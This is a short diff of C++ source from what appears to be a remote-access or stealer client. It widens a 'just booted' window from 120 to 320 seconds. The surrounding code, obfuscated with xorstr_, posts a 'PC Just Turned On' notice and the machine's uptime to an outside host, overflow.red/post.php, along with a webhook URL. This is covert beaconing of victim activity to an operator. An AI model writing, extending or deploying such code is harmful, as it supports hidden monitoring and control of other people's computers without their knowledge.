@@ -36,7 +36,7 @@ namespace client {
 
 		/* Determine If Ran From Startup */
 		auto uptime = std::chrono::milliseconds(GetTickCount64());
-		if ((uptime / 1000).count() <= 120) {
+		if ((uptime / 1000).count() <= 320) {
 			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + std::to_string((uptime / 60000).count()) + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 		}
 
